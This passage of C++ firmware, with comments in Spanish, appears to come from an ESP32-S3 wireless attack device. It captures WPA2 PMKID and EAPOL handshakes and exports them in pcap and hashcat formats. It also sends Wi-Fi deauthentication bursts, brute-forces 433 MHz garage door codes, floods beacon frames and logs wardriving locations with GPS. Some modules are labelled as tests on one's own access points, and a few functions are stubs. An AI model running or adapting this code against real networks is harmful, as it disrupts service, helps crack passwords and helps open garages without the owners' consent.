            for (int i = 36; i < pkt->rx_ctrl.sig_len - 16; i++) {
                if (frame[i] == 0xDD && frame[i+2] == 0x00 && frame[i+3] == 0x0F && 
                    frame[i+4] == 0xAC && frame[i+5] == 0x04) {
                    WiFiHandshake pmkid;
                    memcpy(pmkid.bssid, &frame[10], 6);
                    pmkid.frame_type = 0;
                    pmkid.timestamp = millis();
                    pmkid.rssi = ctrl->rssi;
                    pmkid.data_len = 22;
                    memcpy(pmkid.data, &frame[i], 22);
                    
                    if (marauder.capturedHandshakes.size() > 100) {
                        marauder.capturedHandshakes.erase(marauder.capturedHandshakes.begin());
                    }
                    marauder.capturedHandshakes.push_back(pmkid);
                    marauder.saveHandshakeToSD(pmkid);
                    break;
                }
            }
        }
    });
    
    esp_wifi_set_promiscuous_filter(&(wifi_promiscuous_filter_t){
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    });
    esp_wifi_set_promiscuous_ctrl_filter(&(wifi_promiscuous_filter_t){
        .filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL
    });
    
    Serial.println("[WiFi] 📡 Modo promiscuo activado - Capturando handshakes...");
}

void MarauderS3::saveHandshakeToSD(WiFiHandshake& handshake) {
    if (!sdCardMounted) return;
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
        exportToPCAP(handshake);
        logJSON(handshake);
        if (gpsFixed) { warDriveLog(); }
        xSemaphoreGive(spiMutex);
    }
}

void MarauderS3::exportToPCAP(WiFiHandshake& handshake) {
    if (!pcapFile || !pcapFile.available()) {
        char filename[64];
        snprintf(filename, sizeof(filename), "/pcap/handshake_%04d.pcap", handshakeCount % 1000);
        pcapFile = SD.open(filename, FILE_APPEND);
        
        if (pcapFile.position() == 0) {
            uint8_t pcap_header[] = {
                0xD4, 0xC3, 0xB2, 0xA1, 0x02, 0x00, 0x04, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00
            };
            pcapFile.write(pcap_header, 24);
        }
    }
    
    if (pcapFile) {
        uint32_t ts_sec = handshake.timestamp / 1000;
        uint32_t ts_usec = (handshake.timestamp % 1000) * 1000;
        pcapFile.write((uint8_t*)&ts_sec, 4);
        pcapFile.write((uint8_t*)&ts_usec, 4);
        pcapFile.write((uint8_t*)&handshake.data_len, 4);
        pcapFile.write((uint8_t*)&handshake.data_len, 4);
        pcapFile.write(handshake.data, handshake.data_len);
        pcapFile.flush();
    }
}

void MarauderS3::logJSON(WiFiHandshake& handshake) {
    if (jsonLogFile) {
        char bssid_str[18], station_str[18];
        snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 handshake.bssid[0], handshake.bssid[1], handshake.bssid[2],
                 handshake.bssid[3], handshake.bssid[4], handshake.bssid[5]);
        snprintf(station_str, sizeof(station_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 handshake.station[0], handshake.station[1], handshake.station[2],
                 handshake.station[3], handshake.station[4], handshake.station[5]);
        
        jsonLogFile.printf("{\"type\":\"handshake\",\"frame\":%d,\"bssid\":\"%s\",\"station\":\"%s\",\"rssi\":%d,\"ts\":%lu,\"gps\":[%.6f,%.6f]},\n",
                          handshake.frame_type, bssid_str, station_str, 
                          handshake.rssi, handshake.timestamp,
                          handshake.gps_lat, handshake.gps_lng);
        jsonLogFile.flush();
    }
}

void MarauderS3::closeJSONLog() {
    if (jsonLogFile) {
        // En un caso real habría que quitar la última coma si la hay,
        // pero esto al menos cierra el bloque.
        jsonLogFile.println("]}");
        jsonLogFile.close();
        Serial.println("[SD] 📝 JSON log cerrado correctamente");
    }
}

void MarauderS3::warDriveLog() {
    if (warDriveFile && gpsFixed) {
        warDriveFile.printf("%lu,%.6f,%.6f,%s,%s,%d,%d,%s\n",
                          millis(), gpsData.lat, gpsData.lng,
                          "AA:BB:CC:DD:EE:FF", "WiFi-Name", -55, 6, "WPA2");
        warDriveFile.flush();
    }
}

// ─── CC1101 433MHz ───
void MarauderS3::initCC1101() {
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        pinMode(CC1101_CS, OUTPUT);
        digitalWrite(CC1101_CS, HIGH);
        
        uint8_t cc1101_config[] = {
            0x04, 0x2E, 0x2E, 0x07, 0xD3, 0x91, 0xFF, 0x04, 0x32, 0x00, 0x00, 0x06, 0x00, 0x10, 0xA7, 0x62,
            0xF8, 0x83, 0x13, 0x22, 0xF8, 0x47, 0xB6, 0x0C, 0x18, 0x1E, 0x1C, 0xC7, 0x00, 0xB2, 0xEA, 0x0A,
            0x00, 0x11, 0x16, 0x6C, 0x03, 0x40, 0x0D, 0x59, 0x7F, 0x88, 0x31, 0x0B, 0x88, 0x31, 0x09
        };
        
        SPI.beginTransaction(SPISettings(6000000, MSBFIRST, SPI_MODE0));
        digitalWrite(CC1101_CS, LOW);
        delayMicroseconds(10);
        SPI.transfer(0x30);
        delay(10);
        digitalWrite(CC1101_CS, HIGH);
        delayMicroseconds(10);
        
        for (int i = 0; i < sizeof(cc1101_config); i++) {
            digitalWrite(CC1101_CS, LOW);
            delayMicroseconds(10);
            SPI.transfer(0x00 | (i & 0x3F));
            SPI.transfer(cc1101_config[i]);
            digitalWrite(CC1101_CS, HIGH);
            delayMicroseconds(10);
        }
        SPI.endTransaction();
        
        cc1101Ready = true;
        Serial.println("[CC1101] ✅ Inicializado en 433.92 MHz");
        xSemaphoreGive(spiMutex);
    }
}

void MarauderS3::scan433MHz() {
    if (!cc1101Ready) return;
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
        SPI.beginTransaction(SPISettings(6000000, MSBFIRST, SPI_MODE0));
        digitalWrite(CC1101_CS, LOW);
        SPI.transfer(0x34);
        digitalWrite(CC1101_CS, HIGH);
        SPI.endTransaction();
        
        delay(50);
        SPI.beginTransaction(SPISettings(6000000, MSBFIRST, SPI_MODE0));
        digitalWrite(CC1101_CS, LOW);
        SPI.transfer(0x34 | 0x80);
        int rssi = SPI.transfer(0x00);
        digitalWrite(CC1101_CS, HIGH);
        SPI.endTransaction();
        
        int rssi_dbm = ((rssi >= 128) ? (rssi - 256) / 2 : rssi / 2) - 74;
        if (rssi_dbm > -90) {
            SPI.beginTransaction(SPISettings(6000000, MSBFIRST, SPI_MODE0));
            digitalWrite(CC1101_CS, LOW);
            uint8_t rxfifo = SPI.transfer(0x3B | 0x80);
            uint8_t bytes_avail = SPI.transfer(0x00);
            digitalWrite(CC1101_CS, HIGH);
            SPI.endTransaction();
            
            if (bytes_avail > 0) {
                captureSubGHzSignal();
            }
        }
        xSemaphoreGive(spiMutex);
    }
}

void MarauderS3::captureSubGHzSignal() {
    SubGHzSignal sig;
    sig.timestamp = millis();
    sig.frequency = 433920000;
    
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
        SPI.beginTransaction(SPISettings(6000000, MSBFIRST, SPI_MODE0));
        digitalWrite(CC1101_CS, LOW);
        SPI.transfer(0xFF | 0x80);
        for (int i = 0; i < 64; i++) {
            sig.raw_data[i] = SPI.transfer(0x00);
        }
        digitalWrite(CC1101_CS, HIGH);
        SPI.endTransaction();
        
        sig.data_len = 64;
        if (capturedSignals.size() > 100) {
            capturedSignals.erase(capturedSignals.begin());
        }
        capturedSignals.push_back(sig);
        
        if (sdCardMounted) {
            char filename[64];
            snprintf(filename, sizeof(filename), "/signals/sig_%lu.bin", sig.timestamp);
            File sigFile = SD.open(filename, FILE_WRITE);
            if (sigFile) {
                sigFile.write(sig.raw_data, sig.data_len);
                sigFile.close();
            }
        }
        xSemaphoreGive(spiMutex);
    }
}

void MarauderS3::bruteForceGarageDoors() {
    if (!cc1101Ready) return;
    uint16_t common_codes[] = { 0x555, 0xAAA, 0x3FF, 0x7FF, 0xFFF, 0x001, 0x100, 0x200 };
    
    Serial.println("[CC1101] 🔓 Iniciando brute force de puertas...");
    for (int i = 0; i < 8; i++) {
        if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
            // Activar TX Mode
            SPI.beginTransaction(SPISettings(6000000, MSBFIRST, SPI_MODE0));
            digitalWrite(CC1101_CS, LOW);
            SPI.transfer(0x35); // STX
            digitalWrite(CC1101_CS, HIGH);
            SPI.endTransaction();
            
            // Simulación OOK (On-Off Keying)
            // IMPORTANTE: En hardware real se usa el pin GDO0 en modo Asynchronous TX
            // modulando con `delayMicroseconds()` para el protocolo (Keeloq, PT2262, etc).
            uint16_t code = common_codes[i];
            for (int bit = 0; bit < 12; bit++) {
                bool bit_val = (code & (1 << bit));
                // OOK pulse sim (ejemplo simple)
                delayMicroseconds(bit_val ? 1000 : 500); 
            }
            
            // Volver a Idle
            SPI.beginTransaction(SPISettings(6000000, MSBFIRST, SPI_MODE0));
            digitalWrite(CC1101_CS, LOW);
            SPI.transfer(0x36); // SIDLE
            digitalWrite(CC1101_CS, HIGH);
            SPI.endTransaction();
            
            delay(200);
            xSemaphoreGive(spiMutex);
        }
    }
}

// ─── DEAUTH AUTOMÁTICO ───
void MarauderS3::startDeauthAttack(int targetIndex) {
    WiFi.mode(WIFI_MODE_AP);
    esp_wifi_set_channel(targetIndex % 14 + 1, WIFI_SECOND_CHAN_NONE);
    deauthCount = 0;
    
    // Frame de deautenticación estándar (Broadcast BSSID/STA)
    uint8_t deauth_frame[26] = {
        0xC0, 0x00, 0x00, 0x00, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destino: Broadcast
        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // BSSID (Target)
        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // Source
        0x00, 0x00, 
        0x07, 0x00  // Reason: Class 3 frame received from nonassociated STA
    };
    
    // Ráfaga de deauth
    for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        deauthCount++;
        delay(10);
    }
    
    Serial.printf("[WiFi] 💥 Deauth enviado (Canal %d)\n", targetIndex % 14 + 1);
    
    if (statusLabel) {
        lv_label_set_text(statusLabel, "DEAUTH ATTACK!");
        lv_obj_set_style_text_color(statusLabel, lv_color_hex(C_LOW), LV_PART_MAIN);
    }
}

void MarauderS3::stopDeauthAttack() {
    deauthCount = 0;
    if (statusLabel) {
        lv_label_set_text(statusLabel, "Listo");
        lv_obj_set_style_text_color(statusLabel, lv_color_hex(0x2C1810), LV_PART_MAIN);
    }
}

void MarauderS3::replaySignal(SubGHzSignal& signal) {
    // TODO: Implementar retransmisión de señal capturada via CC1101
    showToast("Replay no implementado", C_WARNING);
}

void MarauderS3::autoDeauthWeakSignals() {
    // TODO: Implementar deauth automático basado en RSSI
    showToast("AutoDeauth pendiente", C_WARNING);
}

// ============================================================================
// [NEW] MÓDULO: 802.11 Frame Generator - Para pruebas en APs propios
// ============================================================================

// ========== 80211_FRAME_GENERATOR ==========

uint8_t* MarauderS3::build80211ManagementFrame(const TestFrameConfig& cfg, uint16_t* out_len) {
    uint16_t frame_size = 24 + cfg.ie_len + 4;
    uint8_t* frame = (uint8_t*)heap_caps_malloc(frame_size, MALLOC_CAP_SPIRAM);
    if (!frame) frame = (uint8_t*)malloc(frame_size);
    if (!frame) return nullptr;
    
    uint8_t* ptr = frame;
    uint16_t fc = 0x0000;
    fc |= (cfg.frame_type & 0x03) << 2;
    fc |= (cfg.subtype & 0x0F) << 4;
    *ptr++ = fc & 0xFF;
    *ptr++ = (fc >> 8) & 0xFF;
    
    uint16_t duration = 0;
    *ptr++ = duration & 0xFF;
    *ptr++ = (duration >> 8) & 0xFF;
    
    uint8_t bc_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    memcpy(ptr, cfg.dest_mac ? cfg.dest_mac : bc_mac, 6);
    ptr += 6;
    memcpy(ptr, cfg.source_mac, 6);
    ptr += 6;
    memcpy(ptr, cfg.bssid, 6);
    ptr += 6;
    
    uint16_t seq = (cfg.seq_control & 0x0FFF) << 4;
    *ptr++ = seq & 0xFF;
    *ptr++ = (seq >> 8) & 0xFF;
    
    if (cfg.ie_data && cfg.ie_len > 0) {
        memcpy(ptr, cfg.ie_data, cfg.ie_len);
        ptr += cfg.ie_len;
    }
    
    *out_len = ptr - frame;
    return frame;
}

uint8_t* buildSSID_IE(const char* ssid, uint8_t* out_len) {
    uint8_t ssid_len = strlen(ssid);
    uint8_t* ie = (uint8_t*)malloc(2 + ssid_len);
    ie[0] = 0x00;
    ie[1] = ssid_len;
    memcpy(ie + 2, ssid, ssid_len);
    *out_len = 2 + ssid_len;
    return ie;
}

uint8_t* buildRates_IE(const uint8_t* rates, uint8_t rate_count, uint8_t* out_len) {
    *out_len = 2 + rate_count;
    uint8_t* ie = (uint8_t*)malloc(*out_len);
    ie[0] = 0x01;
    ie[1] = rate_count;
    memcpy(ie + 2, rates, rate_count);
    return ie;
}

esp_err_t MarauderS3::transmitTestFrame(const TestFrameConfig& cfg) {
    if (cfg.channel >= 1 && cfg.channel <= 14) {
        esp_wifi_set_channel(cfg.channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    #if CONFIG_ESP32_PHY_ENABLE_WIFI_POWER
    esp_wifi_set_max_tx_power(cfg.tx_power * 4);
    #endif
    
    uint16_t frame_len = 0;
    uint8_t* frame = build80211ManagementFrame(cfg, &frame_len);
    if (!frame) return ESP_ERR_NO_MEM;
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, frame, frame_len, false);
    
    if (result == ESP_OK && sdCardMounted) {
        logFrameTransmission(cfg, frame, frame_len);
    }
    
    free(frame);
    return result;
}

void MarauderS3::logFrameTransmission(const TestFrameConfig& cfg, const uint8_t* frame, uint16_t len) {
    if (!jsonLogFile) return;
    uint8_t hash[32];
    mbedtls_sha256_ret(frame, len, hash, 0);
    
    double gps_lat = 0, gps_lng = 0;
    if (gpsFixed && xSemaphoreTake(gpsMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
        gps_lat = gpsData.lat;
        gps_lng = gpsData.lng;
        xSemaphoreGive(gpsMutex);
    }
    
    char hex_buf[65];
    bytesToHex(hash, 32, hex_buf);
    
    jsonLogFile.printf(
        "{\"type\":\"frame_tx\",\"ts\":%lu,\"chan\":%d,\"src\":\"%02X:%02X:%02X:%02X:%02X:%02X\","
        "\"dst\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\","
        "\"len\":%d,\"hash\":\"%s\",\"gps\":[%.6f,%.6f]},\n",
        millis(), cfg.channel,
        cfg.source_mac[0], cfg.source_mac[1], cfg.source_mac[2],
        cfg.source_mac[3], cfg.source_mac[4], cfg.source_mac[5],
        cfg.dest_mac ? cfg.dest_mac[0] : 0xFF, cfg.dest_mac ? cfg.dest_mac[1] : 0xFF,
        cfg.dest_mac ? cfg.dest_mac[2] : 0xFF, cfg.dest_mac ? cfg.dest_mac[3] : 0xFF,
        cfg.dest_mac ? cfg.dest_mac[4] : 0xFF, cfg.dest_mac ? cfg.dest_mac[5] : 0xFF,
        cfg.bssid[0], cfg.bssid[1], cfg.bssid[2],
        cfg.bssid[3], cfg.bssid[4], cfg.bssid[5],
        len, hex_buf, gps_lat, gps_lng
    );
    jsonLogFile.flush();
}

// ==========================

// ============================================================================
// [NEW] MÓDULO: WiFi Traffic Generator
// ============================================================================

// ========== WIFI_TRAFFIC_GEN ==========

void MarauderS3::startTrafficGeneration(const TrafficGenConfig& cfg) {
    Serial.printf("[TrafficGen] 🚀 Iniciando test: %d SSIDs, canal %d, %lus\n", 
                  cfg.ssid_count, cfg.channel, cfg.duration_sec);
    
    WiFi.mode(WIFI_MODE_AP);
    
    uint8_t* beacon_frame = nullptr;
    uint16_t beacon_len = 0;
    
    uint32_t start_time = millis();
    uint32_t frame_count = 0;
    
    while (millis() - start_time < cfg.duration_sec * 1000) {
        if (cfg.channel == 0) {
            uint8_t next_chan = (frame_count % 11) + 1;
            esp_wifi_set_channel(next_chan, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(pdMS_TO_TICKS(5));
        }
        
        for (uint8_t i = 0; i < cfg.ssid_count && i < 50; i++) {
            char test_ssid[64];
            snprintf(test_ssid, sizeof(test_ssid), "%s%02d", cfg.ssid_prefix, i);
            
            beacon_frame = buildBeaconFrame(test_ssid, cfg.beacon_interval, &beacon_len);
            if (!beacon_frame) continue;
            
            esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, beacon_len, false);
            frame_count++;
            
            free(beacon_frame);
            vTaskDelay(pdMS_TO_TICKS(2));
        }
        
        AppEvent evt{EVT_STATUS, (int)frame_count, ""};
        snprintf(evt.msg, sizeof(evt.msg), "Frames: %lu | Tiempo: %lus", 
                 frame_count, (millis() - start_time) / 1000);
        xQueueSend(eventQueue, &evt, 0);
        
        vTaskDelay(pdMS_TO_TICKS(cfg.beacon_interval / 10));
    }
    
    Serial.printf("[TrafficGen] ✅ Test completado: %lu frames transmitidos\n", frame_count);
    
    if (sdCardMounted && xSemaphoreTake(spiMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
        saveTrafficTestResults(cfg, frame_count, millis() - start_time);
        xSemaphoreGive(spiMutex);
    }
}

uint8_t* MarauderS3::buildBeaconFrame(const char* ssid, uint16_t beacon_interval, uint16_t* out_len) {
    uint8_t ssid_len = strlen(ssid);
    uint16_t frame_size = 24 + 8 + 2 + 2 + (2 + ssid_len) + (2 + 8) + (3 + 1) + 4;
    
    uint8_t* frame = (uint8_t*)heap_caps_malloc(frame_size, MALLOC_CAP_SPIRAM);
    if (!frame) frame = (uint8_t*)malloc(frame_size);
    if (!frame) return nullptr;
    
    uint8_t* ptr = frame;
    *ptr++ = 0x80; *ptr++ = 0x00;
    *ptr++ = 0x00; *ptr++ = 0x00;
    
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t my_mac[6];
    esp_read_mac(my_mac, ESP_MAC_WIFI_STA);
    
    memcpy(ptr, broadcast, 6); ptr += 6;
    memcpy(ptr, my_mac, 6); ptr += 6;
    memcpy(ptr, my_mac, 6); ptr += 6;
    
    *ptr++ = 0x00; *ptr++ = 0x00;
    
    uint64_t timestamp = esp_timer_get_time();
    memcpy(ptr, &timestamp, 8); ptr += 8;
    
    *ptr++ = beacon_interval & 0xFF;
    *ptr++ = (beacon_interval >> 8) & 0xFF;
    
    uint16_t cap_info = 0x0411;
    *ptr++ = cap_info & 0xFF;
    *ptr++ = (cap_info >> 8) & 0xFF;
    
    *ptr++ = 0x00;
    *ptr++ = ssid_len;
    memcpy(ptr, ssid, ssid_len); ptr += ssid_len;
    
    uint8_t rates[] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
    *ptr++ = 0x01;
    *ptr++ = sizeof(rates);
    memcpy(ptr, rates, sizeof(rates)); ptr += sizeof(rates);
    
    uint8_t current_chan = 6;
    wifi_second_chan_t secondChan;
    esp_wifi_get_channel(&current_chan, &secondChan);
    *ptr++ = 0x03;
    *ptr++ = 0x01;
    *ptr++ = current_chan;
    
    *ptr++ = 0x05;
    *ptr++ = 0x04;
    *ptr++ = 0x00;
    *ptr++ = 0x01;
    *ptr++ = 0x00;
    *ptr++ = 0x00;
    
    *out_len = ptr - frame;
    return frame;
}

void MarauderS3::saveTrafficTestResults(const TrafficGenConfig& cfg, uint32_t frames_sent, uint32_t duration_ms) {
    if (!sdCardMounted) return;
    
    char filename[64];
    snprintf(filename, sizeof(filename), "/logs/traffic_test_%lu.csv", millis());
    File csv = SD.open(filename, FILE_WRITE);
    if (!csv) return;
    
    csv.println("timestamp,ssid_prefix,ssid_count,beacon_interval,channel,duration_sec,frames_sent,frames_per_sec");
    csv.printf("%lu,%s,%d,%d,%d,%lu,%lu,%.2f\n",
               millis(), cfg.ssid_prefix, cfg.ssid_count, cfg.beacon_interval,
               cfg.channel, cfg.duration_sec, frames_sent,
               (float)frames_sent / (duration_ms / 1000.0f));
    csv.close();
    Serial.printf("[SD] 📊 Resultados guardados en %s\n", filename);
}

// ==========================

// ============================================================================
// [NEW] MÓDULO: WiFi Client Simulator
// ============================================================================

// ========== CLIENT_SIMULATOR ==========

void MarauderS3::setTemporaryMAC(const uint8_t* mac) {
    esp_wifi_set_mac(WIFI_IF_STA, mac);
}

void MarauderS3::processHandshakeEvents(HandshakeTracker& tracker) {
    // Se procesa asíncronamente en el eapolCaptureCallback.
}

void MarauderS3::updateHandshakeUI(HandshakeTracker& tracker) {
    AppEvent evt{EVT_STATUS, 0, ""};
    snprintf(evt.msg, sizeof(evt.msg), "Handshake state: %d", (int)tracker.state);
    xQueueSend(eventQueue, &evt, 0);
}

void MarauderS3::logHandshakeResult(HandshakeTracker& tracker) {
    if (!jsonLogFile) return;
    jsonLogFile.printf("{\"type\":\"sim_result\",\"success\":%s,\"duration\":%lu},\n",
                       tracker.success ? "true" : "false", 
                       tracker.completion_time - tracker.start_time);
    jsonLogFile.flush();
}

void MarauderS3::saveEAPOLFrame(uint8_t* frame, uint16_t len, uint8_t msg_num) {
    exportToPCAP_WithRadiotap(frame, len, -50, 6);
}

void MarauderS3::eapolCaptureCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* frame = pkt->payload;
    
    if (pkt->payload[12] != 0x88 || pkt->payload[13] != 0x8E) return;
    uint8_t eapol_type = frame[15];
    if (eapol_type != 0x03) return;
    
    uint8_t key_desc = frame[18];
    uint16_t key_info = (frame[19] << 8) | frame[20];
    bool is_install = key_info & 0x0400;
    bool is_key_ack = key_info & 0x0100;
    bool is_key_mic = key_info & 0x0008;
    bool is_secure = key_info & 0x0010;
    
    uint8_t msg_num = 0;
    if (is_key_ack && !is_key_mic) msg_num = 1;
    else if (!is_key_ack && is_key_mic) msg_num = 2;
    else if (is_key_ack && is_key_mic && !is_secure) msg_num = 3;
    else if (!is_key_ack && is_key_mic && is_secure) msg_num = 4;
    
    if (Serial) {
        Serial.printf("[EAPOL] M%d | KeyDesc:%d | Install:%d | Ack:%d | MIC:%d | Secure:%d\n",
                      msg_num, key_desc, is_install, is_key_ack, is_key_mic, is_secure);
    }
    
    marauder.saveEAPOLFrame(frame, pkt->rx_ctrl.sig_len, msg_num);
}

void MarauderS3::startClientSimulation(const uint8_t* client_mac, const uint8_t* ap_bssid,
                                        const char* ssid, const char* password) {
    Serial.printf("[ClientSim] 🔐 Iniciando simulación: %02X:%02X... → %s\n",
                  client_mac[0], client_mac[1], ssid);
    
    setTemporaryMAC(client_mac);
    WiFi.mode(WIFI_MODE_STA);
    WiFi.begin(ssid, password);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(eapolCaptureCallback);
    
    HandshakeTracker tracker = {};
    memcpy(tracker.client_mac, client_mac, 6);
    memcpy(tracker.ap_bssid, ap_bssid, 6);
    tracker.state = WPA2HandshakeState::IDLE;
    tracker.start_time = millis();
    
    uint32_t timeout = millis() + 30000;
    while (millis() < timeout && tracker.state != WPA2HandshakeState::COMPLETE) {
        processHandshakeEvents(tracker);
        updateHandshakeUI(tracker);
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    tracker.completion_time = millis();
    tracker.success = (tracker.state == WPA2HandshakeState::COMPLETE);
    
    logHandshakeResult(tracker);
    
    if (tracker.success) {
        Serial.println("[ClientSim] ✅ Handshake completado exitosamente");
        exportToHC22000(tracker, ssid, password);
    } else {
        Serial.printf("[ClientSim] ❌ Handshake fallido o timeout (estado: %d)\n", (int)tracker.state);
    }
    
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();
}

void MarauderS3::exportToHC22000(const HandshakeTracker& tracker, const char* ssid, const char* password) {
    if (!sdCardMounted) return;
    char filename[64];
    snprintf(filename, sizeof(filename), "/pcap/handshake_%02X%02X%02X.hc22000",
             tracker.ap_bssid[3], tracker.ap_bssid[4], tracker.ap_bssid[5]);
    
    File hcFile = SD.open(filename, FILE_APPEND);
    if (!hcFile) return;
    
    hcFile.printf("WPA*01*%s*%02X:%02X:%02X:%02X:%02X:%02X*%02X:%02X:%02X:%02X:%02X:%02X*%s*",
                  "PMKID_PLACEHOLDER",
                  tracker.ap_bssid[0], tracker.ap_bssid[1], tracker.ap_bssid[2],
                  tracker.ap_bssid[3], tracker.ap_bssid[4], tracker.ap_bssid[5],
                  tracker.client_mac[0], tracker.client_mac[1], tracker.client_mac[2],
                  tracker.client_mac[3], tracker.client_mac[4], tracker.client_mac[5],
                  ssid);
    
    hcFile.printf("%02X%02X%02X%02X*%02X%02X%02X%02X*%08X*%08X\n",
                  tracker.anonce[0], tracker.anonce[1], tracker.anonce[2], tracker.anonce[3],
                  tracker.snonce[0], tracker.snonce[1], tracker.snonce[2], tracker.snonce[3],
                  tracker.replay_counter, tracker.completion_time - tracker.start_time);
    
    hcFile.close();
    Serial.printf("[Export] 📁 Handshake guardado en %s (formato hc22000)\n", filename);
}

// ==========================

// ============================================================================
// [NEW] MÓDULO: CC1101 Test Engine
// ============================================================================

// ========== CC1101_TEST_ENGINE ==========

bool MarauderS3::configureCC1101ForTest(const RFTestConfig& cfg) {
    if (!cc1101Ready) return false;
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(200)) != pdTRUE) return false;
    
    SPI.beginTransaction(SPISettings(6000000, MSBFIRST, SPI_MODE0));
    
    digitalWrite(CC1101_CS, LOW);
    delayMicroseconds(10);
    SPI.transfer(0x30);
    delay(10);
    digitalWrite(CC1101_CS, HIGH);
    delayMicroseconds(40);
    
    uint32_t freq_word = (uint64_t)cfg.frequency_hz * 65536 / 26000000;
    writeCC1101Reg(0x0D, (freq_word >> 16) & 0xFF);
    writeCC1101Reg(0x0E, (freq_word >> 8) & 0xFF);
    writeCC1101Reg(0x0F, freq_word & 0xFF);
    
    uint8_t mdmcfg4 = 0, mdmcfg3 = 0, mdmcfg2 = 0;
    switch (cfg.modulation) {
        case 0: mdmcfg4 = 0x00; mdmcfg2 = 0x00; break;
        case 1: mdmcfg4 = 0x00; mdmcfg2 = 0x10; break;
        case 2: mdmcfg4 = 0x00; mdmcfg2 = 0x04; break;
        case 3: mdmcfg4 = 0x10; mdmcfg2 = 0x04; break;
        case 4: mdmcfg4 = 0x20; mdmcfg2 = 0x04; break;
    }
    
    mdmcfg3 = (cfg.baud_rate > 10000) ? 0x83 : 0x43;
    
    writeCC1101Reg(0x00, mdmcfg4);
    writeCC1101Reg(0x01, mdmcfg3);
    writeCC1101Reg(0x02, mdmcfg2);
    
    uint8_t pa_value = mapPowerToCC1101(cfg.tx_power_dbm, cfg.frequency_hz);
    writeCC1101Reg(0x18, pa_value);
    
    writeCC1101Reg(0x06, 0x07);
    writeCC1101Reg(0x03, 0xFF);
    
    SPI.endTransaction();
    xSemaphoreGive(spiMutex);
    
    return true;
}

bool MarauderS3::transmitRFTestPattern(const RFTestConfig& cfg) {
    if (!configureCC1101ForTest(cfg)) return false;
    
    bool success = true;
    for (uint8_t rep = 0; rep < cfg.repeat_count; rep++) {
        if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(100)) != pdTRUE) break;
        
        SPI.beginTransaction(SPISettings(6000000, MSBFIRST, SPI_MODE0));
        
        digitalWrite(CC1101_CS, LOW);
        SPI.transfer(0x35);
        digitalWrite(CC1101_CS, HIGH);
        delayMicroseconds(10);
        
        digitalWrite(CC1101_CS, LOW);
        SPI.transfer(0x3F | 0x80);
        
        SPI.transfer(cfg.pattern_len);
        for (uint16_t i = 0; i < cfg.pattern_len; i++) {
            SPI.transfer(cfg.test_pattern[i]);
        }
        digitalWrite(CC1101_CS, HIGH);
        
        SPI.endTransaction();
        xSemaphoreGive(spiMutex);
        
        delayMicroseconds((cfg.pattern_len * 8 * 1000000) / cfg.baud_rate + 1000);
        
        strobeCC1101(0x36);
        
        Serial.printf("[RF] 📡 Tx #%d: %d bytes @ %d bps, %d dBm\n",
                      rep + 1, cfg.pattern_len, cfg.baud_rate, cfg.tx_power_dbm);
        
        if (rep < cfg.repeat_count - 1) {
            vTaskDelay(pdMS_TO_TICKS(cfg.interval_ms));
        }
    }
    
    return success;
}

uint8_t MarauderS3::mapPowerToCC1101(int8_t dbm, uint32_t freq_hz) {
    if (freq_hz < 500000000) {
        if (dbm >= 10) return 0xC0;
        else if (dbm >= 5) return 0x80;
        else if (dbm >= 0) return 0x60;
        else if (dbm >= -5) return 0x40;
        else return 0x20;
    } else {
        if (dbm >= 8) return 0xC0;
        else if (dbm >= 3) return 0x80;
        else if (dbm >= -2) return 0x60;
        else return 0x40;
    }
}

void MarauderS3::writeCC1101Reg(uint8_t addr, uint8_t value) {
    digitalWrite(CC1101_CS, LOW);
    delayMicroseconds(5);
    SPI.transfer(addr);
    SPI.transfer(value);
    digitalWrite(CC1101_CS, HIGH);
    delayMicroseconds(5);
}

void MarauderS3::strobeCC1101(uint8_t cmd) {
    digitalWrite(CC1101_CS, LOW);
    delayMicroseconds(5);
    SPI.transfer(cmd);
    digitalWrite(CC1101_CS, HIGH);
    delayMicroseconds(5);
}

// ==========================

// ============================================================================
// [NEW] MÓDULO: NRF24L01 Protocol Analyzer
// ============================================================================

// ========== NRF24_ANALYZER ==========

uint64_t MarauderS3::getNRF24RXAddress() {
    uint64_t addr = 0;
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
        SPI.beginTransaction(SPISettings(10000000, MSBFIRST, SPI_MODE0));
